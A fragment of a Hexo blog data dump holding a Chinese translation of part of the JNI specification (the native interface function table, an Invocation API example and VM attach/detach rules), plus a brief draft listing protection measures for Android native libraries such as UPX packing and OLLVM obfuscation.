</span><br></pre></td></tr></table></figure>\n\n<p>VM初始化函数表。注意，前三个条目是为了将来与COM兼容而保留的。此外，我们在函数表的开始处保留了许多额外的空条目，以便将来与类相关的JNI操作可以添加在FindClass之后，而不是在表的末尾。</p>\n<p>注意，函数表可以在所有JNI接口指针之间共享。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">JNINativeInterface</span> ... =</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">    <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">    <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">    <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">    GetVersion,</span><br><span class=\"line\"></span><br><span class=\"line\">    DefineClass,</span><br><span class=\"line\">    FindClass,</span><br><span class=\"line\"></span><br><span class=\"line\">    FromReflectedMethod,</span><br><span class=\"line\">    FromReflectedField,</span><br><span class=\"line\">    ToReflectedMethod,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetSuperclass,</span><br><span class=\"line\">    IsAssignableFrom,</span><br><span class=\"line\"></span><br><span class=\"line\">    ToReflectedField,</span><br><span class=\"line\"></span><br><span class=\"line\">    Throw,</span><br><span class=\"line\">    ThrowNew,</span><br><span class=\"line\">    ExceptionOccurred,</span><br><span class=\"line\">    ExceptionDescribe,</span><br><span class=\"line\">    ExceptionClear,</span><br><span class=\"line\">    FatalError,</span><br><span class=\"line\"></span><br><span class=\"line\">    PushLocalFrame,</span><br><span class=\"line\">    PopLocalFrame,</span><br><span class=\"line\"></span><br><span class=\"line\">    NewGlobalRef,</span><br><span class=\"line\">    DeleteGlobalRef,</span><br><span class=\"line\">    DeleteLocalRef,</span><br><span class=\"line\">    IsSameObject,</span><br><span class=\"line\">    NewLocalRef,</span><br><span class=\"line\">    EnsureLocalCapacity,</span><br><span class=\"line\"></span><br><span class=\"line\">    AllocObject,</span><br><span class=\"line\">    NewObject,</span><br><span class=\"line\">    NewObjectV,</span><br><span class=\"line\">    NewObjectA,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetObjectClass,</span><br><span class=\"line\">    IsInstanceOf,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetMethodID,</span><br><span class=\"line\"></span><br><span class=\"line\">    CallObjectMethod,</span><br><span class=\"line\">    CallObjectMethodV,</span><br><span class=\"line\">    CallObjectMethodA,</span><br><span class=\"line\">    CallBooleanMethod,</span><br><span class=\"line\">    CallBooleanMethodV,</span><br><span class=\"line\">    CallBooleanMethodA,</span><br><span class=\"line\">    CallByteMethod,</span><br><span class=\"line\">    CallByteMethodV,</span><br><span class=\"line\">    CallByteMethodA,</span><br><span class=\"line\">    CallCharMethod,</span><br><span class=\"line\">    CallCharMethodV,</span><br><span class=\"line\">    CallCharMethodA,</span><br><span class=\"line\">    CallShortMethod,</span><br><span class=\"line\">    CallShortMethodV,</span><br><span class=\"line\">    CallShortMethodA,</span><br><span class=\"line\">    CallIntMethod,</span><br><span class=\"line\">    CallIntMethodV,</span><br><span class=\"line\">    CallIntMethodA,</span><br><span class=\"line\">    CallLongMethod,</span><br><span class=\"line\">    CallLongMethodV,</span><br><span class=\"line\">    CallLongMethodA,</span><br><span class=\"line\">    CallFloatMethod,</span><br><span class=\"line\">    CallFloatMethodV,</span><br><span class=\"line\">    CallFloatMethodA,</span><br><span class=\"line\">    CallDoubleMethod,</span><br><span class=\"line\">    CallDoubleMethodV,</span><br><span class=\"line\">    CallDoubleMethodA,</span><br><span class=\"line\">    CallVoidMethod,</span><br><span class=\"line\">    CallVoidMethodV,</span><br><span class=\"line\">    CallVoidMethodA,</span><br><span class=\"line\"></span><br><span class=\"line\">    CallNonvirtualObjectMethod,</span><br><span class=\"line\">    CallNonvirtualObjectMethodV,</span><br><span class=\"line\">    CallNonvirtualObjectMethodA,</span><br><span class=\"line\">    CallNonvirtualBooleanMethod,</span><br><span class=\"line\">    CallNonvirtualBooleanMethodV,</span><br><span class=\"line\">    CallNonvirtualBooleanMethodA,</span><br><span class=\"line\">    CallNonvirtualByteMethod,</span><br><span class=\"line\">    CallNonvirtualByteMethodV,</span><br><span class=\"line\">    CallNonvirtualByteMethodA,</span><br><span class=\"line\">    CallNonvirtualCharMethod,</span><br><span class=\"line\">    CallNonvirtualCharMethodV,</span><br><span class=\"line\">    CallNonvirtualCharMethodA,</span><br><span class=\"line\">    CallNonvirtualShortMethod,</span><br><span class=\"line\">    CallNonvirtualShortMethodV,</span><br><span class=\"line\">    CallNonvirtualShortMethodA,</span><br><span class=\"line\">    CallNonvirtualIntMethod,</span><br><span class=\"line\">    CallNonvirtualIntMethodV,</span><br><span class=\"line\">    CallNonvirtualIntMethodA,</span><br><span class=\"line\">    CallNonvirtualLongMethod,</span><br><span class=\"line\">    CallNonvirtualLongMethodV,</span><br><span class=\"line\">    CallNonvirtualLongMethodA,</span><br><span class=\"line\">    CallNonvirtualFloatMethod,</span><br><span class=\"line\">    CallNonvirtualFloatMethodV,</span><br><span class=\"line\">    CallNonvirtualFloatMethodA,</span><br><span class=\"line\">    CallNonvirtualDoubleMethod,</span><br><span class=\"line\">    CallNonvirtualDoubleMethodV,</span><br><span class=\"line\">    CallNonvirtualDoubleMethodA,</span><br><span class=\"line\">    CallNonvirtualVoidMethod,</span><br><span class=\"line\">    CallNonvirtualVoidMethodV,</span><br><span class=\"line\">    CallNonvirtualVoidMethodA,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetFieldID,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetObjectField,</span><br><span class=\"line\">    GetBooleanField,</span><br><span class=\"line\">    GetByteField,</span><br><span class=\"line\">    GetCharField,</span><br><span class=\"line\">    GetShortField,</span><br><span class=\"line\">    GetIntField,</span><br><span class=\"line\">    GetLongField,</span><br><span class=\"line\">    GetFloatField,</span><br><span class=\"line\">    GetDoubleField,</span><br><span class=\"line\">    SetObjectField,</span><br><span class=\"line\">    SetBooleanField,</span><br><span class=\"line\">    SetByteField,</span><br><span class=\"line\">    SetCharField,</span><br><span class=\"line\">    SetShortField,</span><br><span class=\"line\">    SetIntField,</span><br><span class=\"line\">    SetLongField,</span><br><span class=\"line\">    SetFloatField,</span><br><span class=\"line\">    SetDoubleField,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetStaticMethodID,</span><br><span class=\"line\"></span><br><span class=\"line\">    CallStaticObjectMethod,</span><br><span class=\"line\">    CallStaticObjectMethodV,</span><br><span class=\"line\">    CallStaticObjectMethodA,</span><br><span class=\"line\">    CallStaticBooleanMethod,</span><br><span class=\"line\">    CallStaticBooleanMethodV,</span><br><span class=\"line\">    CallStaticBooleanMethodA,</span><br><span class=\"line\">    CallStaticByteMethod,</span><br><span class=\"line\">    CallStaticByteMethodV,</span><br><span class=\"line\">    CallStaticByteMethodA,</span><br><span class=\"line\">    CallStaticCharMethod,</span><br><span class=\"line\">    CallStaticCharMethodV,</span><br><span class=\"line\">    CallStaticCharMethodA,</span><br><span class=\"line\">    CallStaticShortMethod,</span><br><span class=\"line\">    CallStaticShortMethodV,</span><br><span class=\"line\">    CallStaticShortMethodA,</span><br><span class=\"line\">    CallStaticIntMethod,</span><br><span class=\"line\">    CallStaticIntMethodV,</span><br><span class=\"line\">    CallStaticIntMethodA,</span><br><span class=\"line\">    CallStaticLongMethod,</span><br><span class=\"line\">    CallStaticLongMethodV,</span><br><span class=\"line\">    CallStaticLongMethodA,</span><br><span class=\"line\">    CallStaticFloatMethod,</span><br><span class=\"line\">    CallStaticFloatMethodV,</span><br><span class=\"line\">    CallStaticFloatMethodA,</span><br><span class=\"line\">    CallStaticDoubleMethod,</span><br><span class=\"line\">    CallStaticDoubleMethodV,</span><br><span class=\"line\">    CallStaticDoubleMethodA,</span><br><span class=\"line\">    CallStaticVoidMethod,</span><br><span class=\"line\">    CallStaticVoidMethodV,</span><br><span class=\"line\">    CallStaticVoidMethodA,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetStaticFieldID,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetStaticObjectField,</span><br><span class=\"line\">    GetStaticBooleanField,</span><br><span class=\"line\">    GetStaticByteField,</span><br><span class=\"line\">    GetStaticCharField,</span><br><span class=\"line\">    GetStaticShortField,</span><br><span class=\"line\">    GetStaticIntField,</span><br><span class=\"line\">    GetStaticLongField,</span><br><span class=\"line\">    GetStaticFloatField,</span><br><span class=\"line\">    GetStaticDoubleField,</span><br><span class=\"line\"></span><br><span class=\"line\">    SetStaticObjectField,</span><br><span class=\"line\">    SetStaticBooleanField,</span><br><span class=\"line\">    SetStaticByteField,</span><br><span class=\"line\">    SetStaticCharField,</span><br><span class=\"line\">    SetStaticShortField,</span><br><span class=\"line\">    SetStaticIntField,</span><br><span class=\"line\">    SetStaticLongField,</span><br><span class=\"line\">    SetStaticFloatField,</span><br><span class=\"line\">    SetStaticDoubleField,</span><br><span class=\"line\"></span><br><span class=\"line\">    NewString,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetStringLength,</span><br><span class=\"line\">    GetStringChars,</span><br><span class=\"line\">    ReleaseStringChars,</span><br><span class=\"line\"></span><br><span class=\"line\">    NewStringUTF,</span><br><span class=\"line\">    GetStringUTFLength,</span><br><span class=\"line\">    GetStringUTFChars,</span><br><span class=\"line\">    ReleaseStringUTFChars,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetArrayLength,</span><br><span class=\"line\"></span><br><span class=\"line\">    NewObjectArray,</span><br><span class=\"line\">    GetObjectArrayElement,</span><br><span class=\"line\">    SetObjectArrayElement,</span><br><span class=\"line\"></span><br><span class=\"line\">    NewBooleanArray,</span><br><span class=\"line\">    NewByteArray,</span><br><span class=\"line\">    NewCharArray,</span><br><span class=\"line\">    NewShortArray,</span><br><span class=\"line\">    NewIntArray,</span><br><span class=\"line\">    NewLongArray,</span><br><span class=\"line\">    NewFloatArray,</span><br><span class=\"line\">    NewDoubleArray,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetBooleanArrayElements,</span><br><span class=\"line\">    GetByteArrayElements,</span><br><span class=\"line\">    GetCharArrayElements,</span><br><span class=\"line\">    GetShortArrayElements,</span><br><span class=\"line\">    GetIntArrayElements,</span><br><span class=\"line\">    GetLongArrayElements,</span><br><span class=\"line\">    GetFloatArrayElements,</span><br><span class=\"line\">    GetDoubleArrayElements,</span><br><span class=\"line\"></span><br><span class=\"line\">    ReleaseBooleanArrayElements,</span><br><span class=\"line\">    ReleaseByteArrayElements,</span><br><span class=\"line\">    ReleaseCharArrayElements,</span><br><span class=\"line\">    ReleaseShortArrayElements,</span><br><span class=\"line\">    ReleaseIntArrayElements,</span><br><span class=\"line\">    ReleaseLongArrayElements,</span><br><span class=\"line\">    ReleaseFloatArrayElements,</span><br><span class=\"line\">    ReleaseDoubleArrayElements,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetBooleanArrayRegion,</span><br><span class=\"line\">    GetByteArrayRegion,</span><br><span class=\"line\">    GetCharArrayRegion,</span><br><span class=\"line\">    GetShortArrayRegion,</span><br><span class=\"line\">    GetIntArrayRegion,</span><br><span class=\"line\">    GetLongArrayRegion,</span><br><span class=\"line\">    GetFloatArrayRegion,</span><br><span class=\"line\">    GetDoubleArrayRegion,</span><br><span class=\"line\">    SetBooleanArrayRegion,</span><br><span class=\"line\">    SetByteArrayRegion,</span><br><span class=\"line\">    SetCharArrayRegion,</span><br><span class=\"line\">    SetShortArrayRegion,</span><br><span class=\"line\">    SetIntArrayRegion,</span><br><span class=\"line\">    SetLongArrayRegion,</span><br><span class=\"line\">    SetFloatArrayRegion,</span><br><span class=\"line\">    SetDoubleArrayRegion,</span><br><span class=\"line\"></span><br><span class=\"line\">    RegisterNatives,</span><br><span class=\"line\">    UnregisterNatives,</span><br><span class=\"line\"></span><br><span class=\"line\">    MonitorEnter,</span><br><span class=\"line\">    MonitorExit,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetJavaVM,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetStringRegion,</span><br><span class=\"line\">    GetStringUTFRegion,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetPrimitiveArrayCritical,</span><br><span class=\"line\">    ReleasePrimitiveArrayCritical,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetStringCritical,</span><br><span class=\"line\">    ReleaseStringCritical,</span><br><span class=\"line\"></span><br><span class=\"line\">    NewWeakGlobalRef,</span><br><span class=\"line\">    DeleteWeakGlobalRef,</span><br><span class=\"line\"></span><br><span class=\"line\">    ExceptionCheck,</span><br><span class=\"line\"></span><br><span class=\"line\">    NewDirectByteBuffer,</span><br><span class=\"line\">    GetDirectBufferAddress,</span><br><span class=\"line\">    GetDirectBufferCapacity,</span><br><span class=\"line\"></span><br><span class=\"line\">    GetObjectRefType</span><br><span class=\"line\">  &#125;;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"第五章\"><a href=\"#第五章\" class=\"headerlink\" title=\"第五章\"></a>第五章</h2><p>Invocation API允许软件开发商将Java VM加载到任意的原生应用程序中。开发商可以在不链接Java VM源代码的情况下交付支持Java的应用程序。</p>\n<h3 id=\"介绍-1\"><a href=\"#介绍-1\" class=\"headerlink\" title=\"介绍\"></a>介绍</h3><p>下面的代码示例演示了如何在Invocation API中使用函数。在这个例子中，C++代码创建了一个Java VM并调用名为Main.test的静态方法。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;jni.h&gt;</span>       <span class=\"comment\">/* where everything is defined */</span></span></span><br><span class=\"line\">...</span><br><span class=\"line\">JavaVM *jvm;       <span class=\"comment\">/* denotes a Java VM */</span></span><br><span class=\"line\">JNIEnv *env;       <span class=\"comment\">/* pointer to native method interface */</span></span><br><span class=\"line\">JavaVMInitArgs vm_args; <span class=\"comment\">/* JDK/JRE 6 VM initialization arguments */</span></span><br><span class=\"line\">JavaVMOption* options = new JavaVMOption[<span class=\"number\">1</span>];</span><br><span class=\"line\">options[<span class=\"number\">0</span>].optionString = <span class=\"string\">&quot;-Djava.class.path=/usr/lib/java&quot;</span>;</span><br><span class=\"line\">vm_args.version = JNI_VERSION_1_6;</span><br><span class=\"line\">vm_args.nOptions = <span class=\"number\">1</span>;</span><br><span class=\"line\">vm_args.options = options;</span><br><span class=\"line\">vm_args.ignoreUnrecognized = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"comment\">/* load and initialize a Java VM, return a JNI interface</span></span><br><span class=\"line\"><span class=\"comment\"> * pointer in env */</span></span><br><span class=\"line\">JNI_CreateJavaVM(&amp;jvm, (<span class=\"type\">void</span>**)&amp;env, &amp;vm_args);</span><br><span class=\"line\">delete options;</span><br><span class=\"line\"><span class=\"comment\">/* invoke the Main.test method using the JNI */</span></span><br><span class=\"line\">jclass cls = env-&gt;FindClass(<span class=\"string\">&quot;Main&quot;</span>);</span><br><span class=\"line\">jmethodID mid = env-&gt;GetStaticMethodID(cls, <span class=\"string\">&quot;test&quot;</span>, <span class=\"string\">&quot;(I)V&quot;</span>);</span><br><span class=\"line\">env-&gt;CallStaticVoidMethod(cls, mid, <span class=\"number\">100</span>);</span><br><span class=\"line\"><span class=\"comment\">/* We are done. */</span></span><br><span class=\"line\">jvm-&gt;DestroyJavaVM();</span><br></pre></td></tr></table></figure>\n\n<p>这个例子使用了API中的三个函数。Invocation API允许原生应用程序使用JNI接口指针访问VM特性。</p>\n<h3 id=\"创建VM\"><a href=\"#创建VM\" class=\"headerlink\" title=\"创建VM\"></a>创建VM</h3><p>JNI_CreateJavaVM函数加载并初始化一个Java VM，并返回一个指向JNI接口指针的指针。调用JNI_CreateJavaVM函数的线程被作为主线程。</p>\n<h3 id=\"绑定VM\"><a href=\"#绑定VM\" class=\"headerlink\" title=\"绑定VM\"></a>绑定VM</h3><p>JNI接口指针JNIEnv仅在当前线程有效。如果另一个线程需要访问Java VM，它必须先调用AttachCurrentThread将自己绑定到VM，并获得JNI接口指针。一旦绑定到VM，原生线程就像运行在原生方法内部的普通Java线程一样工作。原生线程保持与VM绑定，直到调用DetachCurrentThread来解绑自己。</p>\n<p>绑定线程应该有足够的堆栈空间来执行一定数量的工作。每个线程的堆栈空间分配特定于操作系统。</p>\n<h3 id=\"解绑VM\"><a href=\"#解绑VM\" class=\"headerlink\" title=\"解绑VM\"></a>解绑VM</h3><p>绑定到VM的原生线程在退出之前必须调用DetachCurrentThread来解绑自己。如果调用堆栈上有Java方法，线程不能解绑自己。</p>\n<h3 id=\"卸载VM\"><a href=\"#卸载VM\" class=\"headerlink\" title=\"卸载VM\"></a>卸载VM</h3><p>JNI_DestroyJavaVM函数卸载一个Java VM。从JDK/JRE1.1开始，只有主线程可以通过调用DestroyJavaVM卸载VM。从JDK/JRE1.2开始限制被取消，任何线程都可以调用DestroyJavaVM卸载VM。</p>\n<p>VM等待直到当前线程成为唯一的非守护用户线程才真正卸载。用户线程包括Java线程和绑定的原生线程。存在此限制是因为Java线程或绑定的原生线程可能持有系统资源，比如锁、窗口等。VM不能自动释放这些资源。通过将当前线程限制为卸载VM时唯一运行的线程，程序员将承担释放任意线程占用系统资源的责任。</p>\n<h3 id=\"库和版本管理\"><a href=\"#库和版本管理\" class=\"headerlink\" title=\"库和版本管理\"></a>库和版本管理</h3><p>从JDK/JRE 1.1开始，一旦原生库被加载，它在所有类加载器中都是可见的。因此不同类加载器中的两个类可能链接同一个原生方法。这导致两个问题:</p>\n<ul>\n<li>一个类可能错误地链接到在不同类加载器中被同名类载入的原生库</li>\n<li>原生方法可以很容易的混合来自不同类加载器的类。这打破了类加载器提供的名称空间隔离，并导致类型安全问题</li>\n</ul>\n<p>从JDK/JRE 1.2开始，每个类加载器管理自己的一组原生库。同一个JNI原生库不能被载入到多个类加载器中。这样做会导致抛出UnsatisfiedLinkError。比如，System.loadLibrary在将一个原生库载入两个类加载时会抛出UnsatisfiedLinkError。新方法的好处是:</p>\n<ul>\n<li>基于类加载器的名称空间隔离被保留在原生库中。原生库不能很容易的混合来自不同类加载器的类</li>\n<li>此外，当对应的类加载器被垃圾回收时，原生库可以被卸载</li>\n</ul>\n"},{"_content":"","source":"_drafts/ebpf.md","raw":"","slug":"ebpf","published":0,"date":"2025-09-21T10:13:14.096Z","updated":"2025-09-21T10:13:14.096Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmfupwgmq0000wwulagy6grsd","content":"","site":{"data":{}},"cover":false,"excerpt":"","more":""},{"_content":"native防护\n1.使用软件壳工具对so进行加壳\n加壳：pux\n`github.com/upx/upx`\n2.编译OLLVM工具链套件\n3.使用OLLVM进行Native层混淆\n4.环境检测与反调试检测\n5.so文件符号隐藏与精简方法\n","source":"_drafts/so.md","raw":"native防护\n1.使用软件壳工具对so进行加壳\n加壳：pux\n`github.com/upx/upx`\n2.编译OLLVM工具链套件\n3.使用OLLVM进行Native层混淆\n4.环境检测与反调试检测\n5.so文件符号隐藏与精简方法\n","slug":"so","published":0,"date":"2025-09-21T14:36:25.402Z","updated":"2025-09-21T14:48:18.723Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmfupwgmr0001wwulbifx011b","content":"<p>native防护<br>1.使用软件壳工具对so进行加壳<br>加壳：pux<br><code>github.com/upx/upx</code><br>2.编译OLLVM工具链套件<br>3.使用OLLVM进行Native层混淆<br>4.环境检测与反调试检测<br>5.so文件符号隐藏与精简方法</p>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<p>native防护<br>1.使用软件壳工具对so进行加壳<br>加壳：pux<br><code>github.com/upx/upx</code><br>2.编译OLLVM工具链套件<br>3.使用OLLVM进行Native层混淆<br>4.环境检测与反调试检测<br>5.so文件符号隐藏与精简方法</p>\n"}],"PostAsset":[{"_id":"source/_posts/binder/binder_cs.png","slug":"binder_cs.png","post":"cmd44rit4000uv8fyhuk7ct55","modified":0,"renderable":0},{"_id":"source/_posts/binder/binder_principle.png","slug":"binder_principle.png","post":"cmd44rit4000uv8fyhuk7ct55","modified":0,"renderable":0},{"_id":"source/_posts/binder/binder_process.png","slug":"binder_process.png","post":"cmd44rit4000uv8fyhuk7ct55","modified":0,"renderable":0}],"PostCategory":[{"post_id":"cmd44rit1000pv8fy22dtah6w","category_id":"cmd44rit2000rv8fy9denahj5","_id":"cmd44rit3000tv8fy1k8k6n46"}],"PostTag":[],"Tag":[]}}